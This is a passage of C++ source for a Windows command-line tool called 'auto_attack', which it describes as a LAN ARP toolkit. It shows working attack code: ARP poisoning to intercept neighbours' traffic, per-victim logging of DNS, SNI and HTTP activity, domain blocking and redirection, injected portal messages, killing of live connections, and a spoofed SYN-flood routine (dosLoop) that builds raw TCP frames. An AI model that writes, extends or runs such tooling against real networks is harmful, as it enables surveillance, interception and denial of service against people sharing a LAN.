        fprintf(j, "{\n  \"generated\": \"%s\",\n", jesc(stamp).c_str());
        fprintf(j, "  \"myip\": \"%s\",\n  \"gateway\": \"%s\",\n",
                jesc(g_myIp).c_str(), jesc(g_gatewayIp).c_str());
        fprintf(j, "  \"mode\": %d,\n  \"seen\": %ld,\n  \"dns\": %ld,\n"
                   "  \"kills\": %ld,\n  \"repoisons\": %ld,\n  \"gwMacChanges\": %ld,\n",
                (int)g_mode, (long)g_seen, (long)g_dnsBlocked, (long)g_kills,
                (long)g_repoisons, (long)g_gwMacChanges);
        fprintf(j, "  \"devices\": [\n");
        for (size_t i = 0; i < vs.size(); ++i) {
            auto& v = vs[i];
            fprintf(j, "    {\"ip\":\"%s\",\"mac\":\"%s\",\"name\":\"%s\","
                       "\"os\":\"%s\",\"ports\":\"%s\",\"banner\":\"%s\"}%s\n",
                    jesc(v.ip).c_str(), jesc(v.mac).c_str(), jesc(v.name).c_str(),
                    jesc(v.osGuess).c_str(), jesc(v.ports).c_str(), jesc(v.banner).c_str(),
                    i + 1 < vs.size() ? "," : "");
        }
        fprintf(j, "  ],\n  \"activity\": [\n");
        for (size_t i = 0; i < acts.size(); ++i) {
            auto& a = acts[i];
            std::string pk, ek; long pv = 0, ev = 0;
            topOf(a.proto, pk, pv);
            topOf(a.peers, ek, ev);
            fprintf(j, "    {\"ip\":\"%s\",\"dns\":%ld,\"sni\":%ld,\"http\":%ld,"
                       "\"events\":%llu,\"up\":%llu,\"down\":%llu,"
                       "\"topProto\":\"%s\",\"topPeer\":\"%s\","
                       "\"quic\":%ld,\"doh\":%ld,\"dot\":%ld,\"vpn\":%ld,\"dnsDirect\":%ld,"
                       "\"recent\":[",
                    jesc(a.ip).c_str(), a.dnsCount, a.sniCount, a.httpCount,
                    a.events, a.byUp, a.byDown,
                    jesc(pk).c_str(), jesc(ek).c_str(),
                    a.quic, a.doh, a.dot, a.vpn, a.dnsDirect);
            {
                size_t start = a.recent.size() > 50 ? a.recent.size() - 50 : 0;
                for (size_t k = start; k < a.recent.size(); ++k)
                    fprintf(j, "%s\"%s\"", k == start ? "" : ",",
                            jesc(a.recent[k]).c_str());
            }
            fprintf(j, "]}%s\n", i + 1 < acts.size() ? "," : "");
        }
        fprintf(j, "  ],\n  \"rules\": [\n");
        for (size_t i = 0; i < rules.size(); ++i) {
            auto& r = rules[i];
            fprintf(j, "    {\"pattern\":\"%s\",\"action\":\"%s\",\"target\":\"%s\","
                       "\"victim\":\"%s\"}%s\n",
                    jesc(r.pattern).c_str(), jesc(r.action).c_str(),
                    jesc(r.targetIp).c_str(), jesc(r.victim).c_str(),
                    i + 1 < rules.size() ? "," : "");
        }
        fprintf(j, "  ],\n  \"artifacts\": {\n    \"captures\": [");
        {
            std::vector<ReportFile> caps = listReportFiles("atk\\captures", "*.pcap");
            for (size_t i = 0; i < caps.size(); ++i)
                fprintf(j, "%s\"captures/%s\"", i ? "," : "", jesc(caps[i].name).c_str());
        }
        fprintf(j, "],\n    \"tracks\": [");
        {
            std::vector<ReportFile> logs = listReportFiles("atk\\tracks", "track_*.log");
            for (size_t i = 0; i < logs.size(); ++i)
                fprintf(j, "%s\"tracks/%s\"", i ? "," : "", jesc(logs[i].name).c_str());
        }
        fprintf(j, "]\n  }\n}\n");
        fclose(j);
    }
    PF("[+] report -> atk\\report.html (%d device(s), %d activity row(s))\n",
       (int)vs.size(), (int)acts.size());
}

static void cmdTracks() {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA("atk\\tracks\\track_*.log", &fd);
    if (h == INVALID_HANDLE_VALUE) { PF("  (no track logs yet)\n"); return; }
    PF("  %-28s %s\n", "FILE", "SIZE");
    do {
        PF("  %-28s %llu bytes\n", fd.cFileName,
           (unsigned long long)(((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow));
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static void cmdBlock(const std::string& domain, const std::string& victim) {
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        std::string pat = "*" + domain + "*";
        bool dup = false;
        for (auto& r : g_dnsRules)
            if (r.pattern == pat && r.victim == victim) { dup = true; break; }
        if (!dup) g_dnsRules.push_back({pat, "block", "", victim});
    }
    PF("[+] blocked %s for %s\n", domain.c_str(), victim.c_str());
    if (victim != "*") controlDnsFor(victim, true);
    else {
        std::vector<Victim> snap;
        { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
        for (auto& v : snap) controlDnsFor(v.ip, true);
    }
}

static void cmdRedirect(const std::string& domain, const std::string& toIp,
                        const std::string& victim) {
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        std::string pat = "*" + domain + "*";
        bool dup = false;
        for (auto& r : g_dnsRules)
            if (r.pattern == pat && r.victim == victim &&
                r.action == "redirect" && r.targetIp == toIp) { dup = true; break; }
        if (!dup) g_dnsRules.push_back({pat, "redirect", toIp, victim});
    }
    PF("[+] %s -> %s for %s\n", domain.c_str(), toIp.c_str(), victim.c_str());
    if (victim != "*") controlDnsFor(victim, true);
    else {
        std::vector<Victim> snap;
        { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
        for (auto& v : snap) controlDnsFor(v.ip, true);
    }
}

static void cmdUnblock(const std::string& domain) {
    std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
    size_t before = g_dnsRules.size();
    g_dnsRules.erase(std::remove_if(g_dnsRules.begin(), g_dnsRules.end(),
        [&](const DnsRule& r){
            return r.pattern.find(domain) != std::string::npos;
        }), g_dnsRules.end());
    PF("[+] cleared %zu rule(s) matching %s\n",
       before - g_dnsRules.size(), domain.c_str());
}

static void cmdRules() {
    std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
    if (g_dnsRules.empty()) { PF("  (no rules)\n"); return; }
    PF("  %-40s %-10s %-16s %s\n", "PATTERN", "ACTION", "TARGET", "VICTIM");
    for (auto& r : g_dnsRules)
        PF("  %-40s %-10s %-16s %s\n", r.pattern.c_str(), r.action.c_str(),
           r.targetIp.empty() ? "-" : r.targetIp.c_str(), r.victim.c_str());
}

static void cmdBlockApp(const std::string& app, const std::string& victim) {
    const AppSig* sig = findAppSig(app);
    if (!sig) { PF("[-] unknown app: %s (try 'appsigs')\n", app.c_str()); return; }
    {
        std::lock_guard<std::mutex> lk(g_blockAppMutex);
        g_blockApp[app].insert(victim);
    }
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        for (auto& p : sig->patterns) {
            std::string pat = "*" + p + "*";
            bool dup = false;
            for (auto& r : g_dnsRules)
                if (r.pattern == pat && r.victim == victim) { dup = true; break; }
            if (!dup) g_dnsRules.push_back({pat, "block", "", victim});
        }
    }
    if (victim != "*") controlDnsFor(victim, true);
    else {
        std::vector<Victim> snap;
        { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
        for (auto& v : snap) controlDnsFor(v.ip, true);
    }
    killMatchingConns(app, victim);
    PF("[+] blocked app '%s' for %s (%zu domains, live conns killed)\n",
       app.c_str(), victim.c_str(), sig->patterns.size());
}

static void cmdUnblockApp(const std::string& app) {
    const AppSig* sig = findAppSig(app);
    if (!sig) { PF("[-] unknown app: %s\n", app.c_str()); return; }
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        for (auto& p : sig->patterns) {
            std::string needle = "*" + p + "*";
            g_dnsRules.erase(
                std::remove_if(g_dnsRules.begin(), g_dnsRules.end(),
                    [&](const DnsRule& r){
                        return r.action == "block" && r.pattern == needle;
                    }),
                g_dnsRules.end());
        }
    }
    {
        std::lock_guard<std::mutex> lk(g_blockAppMutex);
        g_blockApp.erase(app);
    }
    PF("[+] unblocked app '%s'\n", app.c_str());
}

static void cmdApps(const std::string& victim) {
    struct Row { std::set<std::string> apps; };
    std::unordered_map<std::string, Row> byVictim;
    {
        std::lock_guard<std::mutex> lk(g_connMutex);
        for (auto& kv : g_conns) {
            const Conn& c = kv.second;
            if (c.app.empty()) continue;
            if (victim != "*" && c.cip != victim) continue;
            byVictim[c.cip].apps.insert(c.app);
        }
    }
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        for (auto& kv : g_activity) {
            const Activity& a = kv.second;
            if (victim != "*" && a.ip != victim) continue;
            for (auto& app : a.apps) byVictim[a.ip].apps.insert(app);
        }
    }
    if (byVictim.empty()) { PF("  (no apps detected yet)\n"); return; }
    PF("  %-16s %-18s %-10s %s\n", "VICTIM", "NAME", "STATUS", "APPS");
    for (auto& kv : byVictim) {
        std::string list;
        bool anyBlocked = false;
        for (auto& a : kv.second.apps) {
            if (!list.empty()) list += ", ";
            list += a;
            if (appBlocked(a, kv.first)) { list += "*"; anyBlocked = true; }
        }
        PF("  %-16s %-18s %-10s %s\n",
           kv.first.c_str(), victimName(kv.first).c_str(),
           anyBlocked ? "blocked" : "open", list.c_str());
    }
}

static void cmdAppSigs() {
    PF("  %-12s %s\n", "APP", "SIGNATURES");
    for (auto& a : g_appSigs) {
        std::string list;
        for (auto& p : a.patterns) { if (!list.empty()) list += ", "; list += p; }
        PF("  %-12s %s\n", a.name.c_str(), list.c_str());
    }
}

static std::atomic<DWORD> g_portalLastTry{0};

static void ensurePortal() {
    if (g_portalActive) return;
    DWORD now = GetTickCount();
    DWORD last = g_portalLastTry.load();
    if (last != 0 && (now - last) < 2000) return;  // don't hammer :80
    g_portalLastTry = now;
    g_portalTried = true;
    g_portalRun = true;
    if (g_portal.joinable()) g_portal.join();      // previous one already exited
    g_portal = std::thread(portalLoop);
    // wait for the bind result so the caller can report success/failure
    for (int i = 0; i < 30 && !g_portalActive; ++i) Sleep(50);
}

static void cmdMsg(const std::string& victim, const std::string& text) {
    if (!attackOn.load()) {
        PF("[!] message NOT armed: no attack is running.\n");
        PF("    press START (or type g) first, then send the message again.\n");
        return;
    }
    if (text.empty()) { PF("[!] empty message ignored\n"); return; }

    {
        std::lock_guard<std::mutex> lk(g_msgMutex);
        if (victim == "*") g_globalMessage = text;
        else               g_victimMessage[victim] = text;
    }
    ensurePortal();
    if (!g_portalActive) {
        PF("[!] message saved, but the portal is not listening on :80 -\n");
        PF("    the victim cannot see it until port 80 is free.\n");
        return;
    }
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        bool exists = false;
        for (auto& r : g_dnsRules)
            if (r.pattern == "*" && r.victim == victim &&
                r.action == "redirect") { exists = true; break; }
        if (!exists) g_dnsRules.push_back({"*", "redirect", g_myIp, victim});
    }

    // Arm DNS interception immediately.  Waiting for the victim's next DNS
    // query means the first click after "Send" often appears to do nothing.
    // If the victim's resolver has never been observed, the gateway is the
    // resolver on virtually every home/small-office LAN.
    auto arm = [](const std::string& ip) {
        if (!g_gatewayIp.empty()) {
            std::lock_guard<std::mutex> lk(g_victimDnsMutex);
            auto& e = g_victimDns[ip];
            if (e.ip.empty()) e.ip = g_gatewayIp;
            e.stamp = GetTickCount();
        }
        controlDnsFor(ip, true);
    };

    if (victim == "*") {
        std::vector<Victim> snap;
        { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
        int armed = 0;
        for (auto& v : snap) { arm(v.ip); armed++; }
        PF("[+] message armed for %d host(s)\n", armed);
    } else {
        arm(victim);
        PF("[+] message armed for %s\n", victim.c_str());
    }
    PF("[+] the notice appears on the victim's next DNS lookup / portal probe\n");
    PF("    (HTTPS, DoH and IPv6-only DNS can bypass this notice)\n");
}

static void cmdMsgStop(const std::string& victim) {
    {
        std::lock_guard<std::mutex> lk(g_msgMutex);
        if (victim == "*") g_globalMessage.clear();
        else               g_victimMessage.erase(victim);
    }
    {
        std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
        g_dnsRules.erase(
            std::remove_if(g_dnsRules.begin(), g_dnsRules.end(),
                [&](const DnsRule& r){
                    // only remove the portal's own catch-all redirect, never a
                    // user rule that happens to use "*" as the pattern
                    if (r.pattern != "*") return false;
                    if (r.action != "redirect") return false;
                    if (r.targetIp != g_myIp) return false;
                    if (victim == "*") return true;
                    return r.victim == victim;
                }),
            g_dnsRules.end());
    }
    PF("[+] message cleared for %s\n", victim.c_str());
}

static std::atomic<bool> g_dosRun{false};
// set by "flood <ip> [pps]" so a DoS can be aimed at one device without
// starting a full intercept.  A normal "x"/stop clears it again.
static std::atomic<bool> g_dosStandalone{false};
static std::mutex        g_dosMutex;
static std::unordered_set<std::string> g_dosTargets;

static void dosLoop(std::string target) {
    unsigned char tmac[6] = {0};
    if (!victimMac(target, tmac)) {
        PF("[-] dos: unknown mac for %s\n", target.c_str());
        std::lock_guard<std::mutex> lk(g_dosMutex);
        g_dosTargets.erase(target);
        g_dosActive--;
        return;
    }
    uint32_t tip = 0;
    inet_pton(AF_INET, target.c_str(), &tip);
    uint32_t gip = 0;
    inet_pton(AF_INET, g_gatewayIp.c_str(), &gip);

    PF("[+] dos active against %s\n", target.c_str());
    uint16_t sport = (uint16_t)(1024 + (rnd32() % 50000));
    const uint16_t dports[] = {443, 80, 53, 123, 445, 8080};
    while (g_dosRun && (attackOn || g_dosStandalone)) {
        for (int i = 0; i < 60; ++i) {
            unsigned char f[14 + 20 + 20] = {0};
            memcpy(&f[0], tmac, 6);
            memcpy(&f[6], g_myMac, 6);
            f[12] = 0x08; f[13] = 0x00;

            unsigned char* ip = &f[14];
            ip[0] = 0x45;
            ip[2] = 0x00; ip[3] = 0x28;
            ip[4] = (rnd16() >> 8) & 0xFF;
            ip[5] = rnd16() & 0xFF;
            ip[6] = 0x40;
            ip[8] = 64; ip[9] = 6;
            uint32_t srcIp = (gip & 0xFF000000) | (rnd32() & 0x00FFFFFF);
            memcpy(&ip[12], &srcIp, 4);
            memcpy(&ip[16], &tip, 4);
            uint16_t ic = checksum16(ip, 20);
            ip[10] = ic >> 8; ip[11] = ic & 0xFF;

            unsigned char* tcp = ip + 20;
            uint16_t sp = sport++;
            if (sport < 1024) sport = 1024 + (rnd32() % 50000);
            uint16_t dp = dports[i % (sizeof(dports)/sizeof(dports[0]))];
            tcp[0] = sp >> 8; tcp[1] = sp & 0xFF;
            tcp[2] = dp >> 8; tcp[3] = dp & 0xFF;
            tcp[4] = 0; tcp[5] = 0; tcp[6] = 0; tcp[7] = 0;
            tcp[8] = 0; tcp[9] = 0; tcp[10] = 0; tcp[11] = 0;
            tcp[12] = 0x50;
            tcp[13] = 0x02;

            unsigned char pseudo[12 + 20];
            memcpy(pseudo,     &srcIp, 4);
            memcpy(pseudo + 4, &tip, 4);
            pseudo[8] = 0; pseudo[9] = 6;
            pseudo[10] = 0; pseudo[11] = 20;
            memcpy(pseudo + 12, tcp, 20);
            uint16_t tc = checksum16(pseudo, 32);
            tcp[16] = tc >> 8; tcp[17] = tc & 0xFF;
            sendFrame(f, sizeof(f));
        }
        // burst of 60, then pause to hit the requested packet rate. A higher
        // rate floods harder; the floor of 1 ms keeps the thread yieldable.
        int rate = g_dosRate.load();
        if (rate < 200)   rate = 200;
        if (rate > 200000) rate = 200000;
        int pause = 60000 / rate;      // ms for 60 packets at 'rate' pps
        if (pause < 1) pause = 1;
        Sleep(pause);
    }
    PF("[-] dos stopped for %s\n", target.c_str());
    std::lock_guard<std::mutex> lk(g_dosMutex);
    g_dosTargets.erase(target);
    g_dosActive--;
}

static void startDos(const std::string& ip) {
    {
        std::lock_guard<std::mutex> lk(g_dosMutex);
        if (g_dosTargets.count(ip)) { PF("[!] dos already running for %s\n", ip.c_str()); return; }
        g_dosTargets.insert(ip);
    }
    g_dosRun = true;
    g_dosActive++;
    std::thread(dosLoop, ip).detach();
}

static void stopAllDos() {
    g_dosRun = false;
    g_dosStandalone = false;
    PF("[+] stopping all dos threads\n");
}

static BOOL WINAPI ctrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT || type == CTRL_BREAK_EVENT) {
        attackOn = false;
        g_dosRun = false;
        PF("\n[!] ctrl+c - attack stopped, repairing ARP...\n");
        // let a sweeper pass that is already in flight finish first, otherwise
        // it could re-poison right after the repair
        Sleep(500);
        restoreAll();
        PF("[!] ARP repaired. type q to quit, or x to stop again.\n");
        return TRUE;
    }
    if (type == CTRL_CLOSE_EVENT || type == CTRL_LOGOFF_EVENT ||
        type == CTRL_SHUTDOWN_EVENT) {
        // the console is going away: repair before Windows kills us, otherwise
        // the LAN stays poisoned until every ARP cache times out
        attackOn = false;
        g_dosRun = false;
        g_sweeperRun = false;
        g_portalRun = false;
        Sleep(350);
        restoreAll();
        restoreForwarding();
        return TRUE;
    }
    return FALSE;
}

static void monCb(u_char*, const struct pcap_pkthdr* h, const u_char* p) {
    recordPacket(h, p);
    if (h->caplen >= 14 && p[12] == 0x08 && p[13] == 0x06) {
        handleArp(p, h->caplen);
        return;
    }
    g_seen++;
    classifyPacket(p, h->caplen);
}

struct IfChoice {
    std::string name, desc, ip, gateway, mac;
    int index = 0;
};

static std::vector<IfChoice> listInterfaces() {
    std::vector<IfChoice> out;
    PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG len = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(ai, &len) != ERROR_SUCCESS) {
        free(ai);
        ai = (PIP_ADAPTER_INFO)malloc(len);
        if (GetAdaptersInfo(ai, &len) != ERROR_SUCCESS) { free(ai); return out; }
    }
    for (PIP_ADAPTER_INFO p = ai; p; p = p->Next) {
        if (p->Type != MIB_IF_TYPE_ETHERNET &&
            p->Type != IF_TYPE_IEEE80211) continue;
        if (p->IpAddressList.IpAddress.String[0] == '0') continue;
        if (p->GatewayList.IpAddress.String[0] == '0') continue;

        IfChoice c;
        c.name = p->AdapterName;
        c.desc = p->Description;
        c.ip = p->IpAddressList.IpAddress.String;
        c.gateway = p->GatewayList.IpAddress.String;
        c.index = (int)p->Index;
        char b[24];
        snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
                 p->Address[0], p->Address[1], p->Address[2],
                 p->Address[3], p->Address[4], p->Address[5]);
        c.mac = b;
        out.push_back(c);
    }
    free(ai);
    return out;
}

static std::string normGuid(std::string s) {
    std::string o;
    o.reserve(s.size());
    for (unsigned char c : s) {
        if (c == '{' || c == '}') continue;
        o += (char)tolower(c);
    }
    return o;
}

static bool discoverSelfAndGateway(const std::string& chosenGuid) {
    auto list = listInterfaces();
    for (auto& c : list) {
        if (stricmp(c.name.c_str(), chosenGuid.c_str()) == 0) {
            g_myIp       = c.ip;
            g_gatewayIp  = c.gateway;
            g_ifName     = c.desc;
            g_ifGuid     = c.name;
            g_ifIndex    = c.index;
            parseMac(c.mac, g_myMac);
            getMacFromArpCache(g_gatewayIp.c_str(), g_gatewayMac);
            return true;
        }
    }
    return false;
}

static pcap_t* openHandleFor(const std::string& guid, bool sending) {
    pcap_if_t* alldevs = nullptr;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    if (pcap_findalldevs(&alldevs, errbuf) != 0) return nullptr;
    std::string want = normGuid(guid);
    pcap_t* chosen = nullptr;
    for (pcap_if_t* d = alldevs; d; d = d->next) {
        const char* name = d->name ? d->name : "";
        // device names are "\Device\NPF_{GUID}": compare without braces and
        // case-insensitively so a differently-cased GUID still matches
        if (want.empty() || normGuid(name).find(want) == std::string::npos)
            continue;
        // A 64 KB snaplen makes the driver copy every byte of every frame into
        // user space; on WiFi that visibly slows the link.  ARP MITM traffic is
        // unicast to us plus broadcast, so promiscuous mode is not needed and
        // 2 KB keeps all headers and the payload that matters for analysis.
        int snap = sending ? 1 : 2048;
        int promisc = 0;
        int to = sending ? 0 : 30;
        pcap_t* p = pcap_open_live(d->name, snap, promisc, to, errbuf);
        if (!p) continue;
        if (!sending) {
            struct bpf_program fp;
            const char* filt = "arp or ip";
            if (pcap_compile(p, &fp, filt, 1, 0xFFFFFFFF) == 0) {
                pcap_setfilter(p, &fp);
                pcap_freecode(&fp);
            }
        }
        chosen = p;
        break;
    }
    pcap_freealldevs(alldevs);
    return chosen;
}

static void writeSummary() {
    SYSTEMTIME st; GetLocalTime(&st);
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\session_%04d%02d%02d_%02d%02d%02d.json",
             OUTDIR, st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    FILE* f = fopen(path, "w");
    if (!f) return;
    size_t ruleCount = 0;
    { std::lock_guard<std::mutex> lk(g_dnsRuleMutex); ruleCount = g_dnsRules.size(); }
    size_t hostCount = 0, selCount = 0;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        hostCount = g_victims.size();
        for (auto& v : g_victims) if (v.sel) selCount++;
    }
    fprintf(f, "{\n  \"ended\": \"%s\",\n  \"mode\": %d,\n  \"seen\": %ld,\n"
               "  \"arp_replies\": %ld,\n"
               "  \"dns_blocked\": %ld,\n  \"kills\": %ld,\n  \"sent\": %ld,\n"
               "  \"my_ip\": \"%s\",\n  \"gateway\": \"%s\",\n"
               "  \"hosts\": %zu,\n  \"selected\": %zu,\n  \"dns_rules\": %zu\n}\n",
            tsFull().c_str(), (int)g_mode, (long)g_seen, (long)g_arpReplies,
            (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
            g_myIp.c_str(), g_gatewayIp.c_str(),
            hostCount, selCount, ruleCount);
    fclose(f);
    PF("[+] summary -> %s\n", path);
}

static void help() {
    PF(
        "\n  auto_attack %s - LAN ARP toolkit (CLI)\n"
        "  ------------------------------------------------------------\n"
        "  CORE\n"
        "    1 | s | scan              scan the /24 and resolve names\n"
        "    t all | t 1,3-5 | t none  select targets\n"
        "    m <1-6>                   attack mode\n"
        "    g | start                 start attacking selected targets\n"
        "    x | stop                  stop and repair ARP\n"
        "    i | status                show counters\n"
        "    f                         toggle IP forwarding\n"
        "    restore                   repair ARP without stopping\n"
        "    hosts                     list discovered devices\n"
        "    names                     re-resolve device names\n"
        "  MODES\n"
        "    1 intercept  2 tap  3 block  4 record  5 strip(=1)  6 dos\n"
        "  TRACKING\n"
        "    users | top [n] | tracks | watch <ip> | showtrack <ip> [n]\n"
        "    detail <ip> [n]           live event timeline for one device\n"
        "    stats [ip]                traffic breakdown (bytes/protocols/peers)\n"
        "    bypass                    per-device QUIC / DoH / DoT / VPN use\n"
        "    fingerprint [ip|*]        TCP port scan + OS/banner guess\n"
        "    report                    write atk\\report.html + report.json\n"
        "    _focus <ip|none>          focus a device for the GUI timeline\n"
        "    pcap [on|off]             record per-device atk\\captures\\<ip>.pcap\n"
        "    pcapmax [mb]              per-device capture size cap (default 32)\n"
        "    perf                      capture drop stats + current options\n"
        "  NAMES\n"
        "    name <ip> <text|clear>    set a manual name (saved in atk\\names.txt)\n"
        "    autonames [on|off]        retry unnamed hosts in the background\n"
        "  RULES / APPS\n"
        "    block <domain> [ip|*]     redirect <domain> <ip> [ip|*]\n"
        "    unblock <domain>          rules | save | load\n"
        "    apps [ip|*] | appsigs | blockapp <app> [ip|*] | unblockapp <app>\n"
        "  MESSAGES (needs an active attack; served on :80)\n"
        "    msgall <text> | msg <ip> <text> | msgstop [ip|*]\n"
        "    msgtest                   check that the portal answers locally\n"
        "  MISC\n"
        "    kick <ip> | unkick | dosrate <pkts/s>\n"
        "    flood <ip> [pps]          start a DoS at an explicit rate\n"
        "    sweep [ms]                ARP re-poison interval (default 4000)\n"
        "    q                         quit\n"
        "  Start with --adapter=N or --adapter-guid={GUID} to skip the prompt.\n\n",
        APP_VERSION);
}

// quick runtime health check: capture drops and the tunable options.  High
// ps_drop means the machine cannot keep up with the LAN, which is the usual
// reason the whole network feels slow while the tool runs.
static void cmdPerf() {
    if (g_pcap) {
        struct pcap_stat ps{};
        if (pcap_stats(g_pcap, &ps) == 0)
            PF("  pcap    : recv=%u drop=%u ifdrop=%u\n",
               ps.ps_recv, ps.ps_drop, ps.ps_ifdrop);
    }
    int tracked = 0, victims = 0; size_t tf = 0;
    { std::lock_guard<std::mutex> lk(g_activityMutex); tracked = (int)g_activity.size(); }
    { std::lock_guard<std::mutex> lk(g_vmutex);       victims = (int)g_victims.size(); }
    { std::lock_guard<std::mutex> lk(g_trackFilesMutex); tf = g_trackFiles.size(); }
    DWORD rep = g_sweepMs.load(); if (!rep) rep = ARP_REPOISON_MS;
    PF("  state   : victims=%d tracked=%d openTrackFiles=%zu\n", victims, tracked, tf);
    PF("  capture : %s snaplen=2048 promisc=off\n", g_captureOn.load() ? "recording" : "idle");
    PF("  options : repoison=%ums pcapMax=%lluMB autoNames=%s\n",
       (unsigned)rep, g_pcapMaxBytes.load() / (1024ull * 1024ull),
       g_autoNames.load() ? "on" : "off");
}

int main(int argc, char** argv) {
    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        PF("[!] WSAStartup failed\n");
        return 1;
    }
    CreateDirectoryA(OUTDIR, nullptr);
    CreateDirectoryA(TRACK_DIR, nullptr);
    CreateDirectoryA(CAP_DIR, nullptr);
    loadManualNames();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCtrlHandler(ctrlHandler, TRUE);

    int forcedAdapter = -1;
    std::string forcedGuid;
    for (int i = 1; i < argc; ++i) {
        if (strncmp(argv[i], "--adapter=", 10) == 0)
            forcedAdapter = atoi(argv[i] + 10);
        else if (strncmp(argv[i], "--adapter-guid=", 15) == 0)
            forcedGuid = argv[i] + 15;
    }

    auto ifs = listInterfaces();
    if (ifs.empty()) { PF("[!] no adapter with gateway\n"); WSACleanup(); return 1; }

    std::string chosenGuid;
    if (!forcedGuid.empty()) {
        for (auto& c : ifs)
            if (stricmp(c.name.c_str(), forcedGuid.c_str()) == 0) {
                chosenGuid = c.name; break;
            }
        if (chosenGuid.empty())
            PF("[!] adapter-guid %s not found - falling back\n", forcedGuid.c_str());
    }
    if (chosenGuid.empty()) {
        if (forcedAdapter > 0 && forcedAdapter <= (int)ifs.size()) {
            chosenGuid = ifs[forcedAdapter - 1].name;
        } else if (ifs.size() == 1) {
            chosenGuid = ifs[0].name;
        } else {
            PF("  select adapter:\n");
            for (size_t i = 0; i < ifs.size(); ++i)
                PF("    %zu  %-40s  %-15s  gw=%s\n",
                   i + 1, ifs[i].desc.c_str(), ifs[i].ip.c_str(), ifs[i].gateway.c_str());
            PF("  choice [1]: ");
            std::string sel; std::getline(std::cin, sel);
            int idx = atoi(sel.c_str());
            if (idx < 1 || idx > (int)ifs.size()) idx = 1;
            chosenGuid = ifs[idx - 1].name;
        }
    }

    if (!discoverSelfAndGateway(chosenGuid)) {
        PF("[!] adapter discovery failed\n");
        WSACleanup(); return 1;
    }
    PF("[+] interface : %s\n", g_ifName.c_str());
    PF("[+] my ip     : %s / %s\n", g_myIp.c_str(), macToString(g_myMac).c_str());
    PF("[+] gateway   : %s / %s\n", g_gatewayIp.c_str(), macToString(g_gatewayMac).c_str());

    {
        DWORD ifw = 0;
        if (readIfaceForwarding(ifw)) {
            g_ifaceFwdWasOn = (ifw != 0);
            g_ifaceFwdKnown = true;
        }
        // status should show the real current state, not just what we changed
        g_forwardingEnabled = g_ifaceFwdKnown ? g_ifaceFwdWasOn : false;
    }

    g_pcap = openHandleFor(g_ifGuid, false);
    if (!g_pcap) { PF("[!] capture handle failed\n"); WSACleanup(); return 1; }
    g_pcapSend = openHandleFor(g_ifGuid, true);
    if (!g_pcapSend) g_pcapSend = g_pcap;

    if (macZero(g_gatewayMac)) {
        // SendARP can miss right after boot / wake; give it one more try and
        // say clearly what is wrong instead of sending zero-MAC poison frames
        Sleep(200);
        unsigned char m[6] = {0};
        if (getMacFromArpCache(g_gatewayIp.c_str(), m) && !macZero(m))
            memcpy(g_gatewayMac, m, 6);
        if (macZero(g_gatewayMac))
            PF("[!] gateway MAC unresolved - start will be refused.\n"
               "    check the adapter/cable and rescan.\n");
        else
            PF("[+] gateway   : %s / %s\n", g_gatewayIp.c_str(),
               macToString(g_gatewayMac).c_str());
    }

    g_sweeperRun = true;
    g_sweeper = std::thread(sweeperLoop);
    help();
    std::thread monitor([&]{ pcap_loop(g_pcap, 0, monCb, nullptr); });

    std::string line;
    while (g_running) {
        // prompt only on a real console — over the GUI's pipe a bare
        // "> " would corrupt the first line of the next response
        { DWORD m; if (GetConsoleMode(GetStdHandle(STD_INPUT_HANDLE), &m)) PF("> "); }
        if (!std::getline(std::cin, line)) break;
        line = trim(line);
        if (line.empty()) continue;

        if (line == "0" || line == "q" || line == "quit") {
            g_running = false;
            g_quickStartPending = false;
            attackOn = false;
            g_dosRun = false;
            g_dosStandalone = false;
            restoreAll();
            restoreForwarding();
            break;
        }
        if (line == "1" || line == "s" || line == "scan") { startScan(); continue; }
        if (line == "gg") {
            // scan in the background, then select everything and intercept
            g_quickStartPending = true;
            startScan();
            continue;
        }
        if (line == "hosts") {
            std::lock_guard<std::mutex> lk(g_vmutex);
            PF("  %-3s %-15s %-17s %-26s %-9s %s\n", "#", "IP", "MAC", "NAME", "SOURCE", "SEL");
            for (size_t i = 0; i < g_victims.size(); ++i) {
                std::string nm = g_victims[i].name.empty() ? "-" : g_victims[i].name;
                PF("  %-3zu %-15s %-17s %-26s %-9s %s\n", i + 1,
                   g_victims[i].ip.c_str(), g_victims[i].mac.c_str(),
                   nm.c_str(),
                   g_victims[i].name.empty() ? "-" : nameSource(g_victims[i].namePrio),
                   g_victims[i].sel ? "[x]" : "[ ]");
            }
            continue;
        }
        if (line.rfind("name ", 0) == 0) {
            std::istringstream ss(line.substr(5));
            std::string ip, nm;
            ss >> ip;
            std::getline(ss, nm);
            nm = trim(nm);
            cmdName(ip, nm);
            continue;
        }
        if (line == "names" || line == "resolve") { resolveNames(); continue; }
        if (line == "2" || line == "t") {
            PF("  spec: ");
            std::string spec; std::getline(std::cin, spec);
            selectTargets(trim(spec));
            continue;
        }
        if (line.rfind("t ", 0) == 0) { selectTargets(trim(line.substr(2))); continue; }
